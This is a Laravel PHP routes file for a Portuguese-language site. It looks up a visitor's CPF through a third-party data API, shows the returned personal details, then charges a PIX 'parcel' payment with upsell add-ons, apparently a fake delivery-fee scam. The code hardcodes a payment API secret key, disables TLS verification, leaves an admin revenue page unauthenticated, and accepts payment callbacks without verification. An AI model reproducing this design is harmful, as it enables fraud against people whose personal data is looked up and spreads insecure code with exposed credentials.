<?php

use App\Models\Payment;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Log;

Route::get('/', function () {
    return view('welcome');
});


Route::get('/confirmacao', function (Request $request) {

    if (!$request->has('cpf')) {
        return redirect('/')->with('cpf', 'Cpf não encontrado');
    }
    $cpf = $request->get('cpf');
    $url = "https://searchapi.dnnl.live/consulta?token_api=3455&cpf=" . $cpf;
    $response = Http::withoutVerifying()->get($url);

    $data = $response->json();

    if (isset($data['status']) && isset($data['dados']) && $data['status'] == 200) {

        return view('confirmacao', [
            'dados' => $data['dados'][0]
        ]);
    }

    return redirect('/')->with('cpf', 'Cpf não encontrado');
});

Route::get('/adm',function(){
    $pagamentos_pendentes = Payment::where('status','WAITING_PAYMENT')->sum('amount');
    $pagamentos_paid = Payment::where('status','paid')->sum('amount');
    $pagamentos_expired = Payment::where('status','expired')->sum('amount');

    return view('adm',[
        'pagamentos_pendentes' => $pagamentos_pendentes,
        'pagamentos_paid' => $pagamentos_paid,
        'pagamentos_expired' => $pagamentos_expired,
    ]);
});
Route::post('/callback', function (Request $request) {

    $data = $request->all();

    if (isset($data['data']['status']) && $data['data']['status'] == 'paid') {
        $pagamento = Payment::where('transactionId',$data['data']['id'])->first();
        if($pagamento){
            $pagamento->status = $data['data']['status'];
            $pagamento->save();
        }
        $response = Http::withoutVerifying()->get('https://api.pushcut.io/NV4qGYCuqJBCpEpJvLKb7/notifications/Happy%20nation');
        $response = Http::withoutVerifying()->get('https://api.pushcut.io/3e8n_drJUBOdP52n8mPXB/notifications/Disparo');
        $response = Http::withoutVerifying()->get('https://api.pushcut.io/ucVw54ASplYx1DcYwedvl/notifications/Minha%20Primeira%20Notifica%C3%A7%C3%A3o');
    }
});

Route::get('/getStatus/{id}',function($id){
    $pagamento = Payment::find($id);

    if($pagamento){
        return response()->json([
            'status' => $pagamento->status
        ]);
    }
});

Route::get('/encomend', function (Request $request) {

    $cpf = $request->input('cpf', '');
    $name = $request->input('name', '');
    return view('encomenda', [
        "cpf" => $cpf,
        "name" => $name
    ]);
});

Route::get('/pag/{id}', function ($id) {

    $pagamento = Payment::find($id);
    if ($pagamento) {
        return view('pagamento', [
            'qrcode' => $pagamento->result ?? null,
            'value' => $pagamento->amount ?? 0,
            'id' => $pagamento->id,
        ]);
    }
});

Route::get('/pago',function(){
    return view('paid');
});

Route::get('pagamento', function (Request $request) {
 $deviceId = $request->input('device_id');
    if (!$deviceId) {
        return response()->json([
            'message' => 'Dispositivo não identificado.'
        ], 400); // Bad Request
    }
$count = Payment::where('ip', $deviceId)->count();

if ($count >= 5) {
        return response()->json([
            'message' => 'Limite de pagamentos por dispositivo atingido.'
        ], 429);
    }
    $cpf = $request->input('cpf', '');
    $name = $request->input('name', '');
    $value = 67.90;
   if ($request->boolean('bump1')) {
        $value += 19.90;
    }

    if ($request->boolean('bump2')) {
        $value += 4.90;
    }

    if ($request->boolean('bump3')) {
        $value += 14.90;
    }

    $payload = [
        'amount' => intval($value * 100),
        'currency' => 'BRL',
        'paymentMethod' => 'PIX',
        'customer' => [
            'name' => $name,
            'document' => [
                'type' => "CPF",
                'number' => $cpf
            ],
            'email' => 'test@gm.com',
            'phone' => '(11) 98765-4321'
        ],
        'pix' => [
            'expiresInDays' => 3
        ],
        'postbackUrl' => env('APP_URL').'/callback',
        'metadata' => [
            'pedido' => '12345',
            'descricao' => 'Compra'
        ],
        'items' => [
            [
                'title' => 'Jad',
                'unitPrice' => intval($value * 100),
                'quantity' => 1,
                'tangible' => false,
            ]
        ],
        'traceable' => true,
        'ip' => $request->ip(),
    ];
    $username = 'x';
    $password = 'sk_a2834d6b9a4ccb48e07c0af74a735f25faa4a448';

    $authHeader = 'Basic ' . base64_encode("$username:$password");
    $response = Http::withoutVerifying()->withHeaders([
        'Authorization' => $authHeader,
        'Accept' => 'application/json',
        'Content-Type' => 'application/json',
    ])->post('https://api.fastsoftbrasil.com/api/user/transactions', $payload);

    if ($response->successful()) {
        $data = $response->json();
        $payment = Payment::create([
            'transactionId' => $data['data']['id'],
            'status' => $data['data']['status'],
            'amount' => $value,
            'result' => $data['data']['pix']['qrcode'],
             'ip' => $deviceId,
        ]);

        $ur = "/pag/".$payment->id;

        return redirect($ur);
        // return view('pagamento', [
        //     'qrcode' => $data['data']['pix']['qrcode'] ?? null,
        //     'value' => $value
        // ]);
    }
});
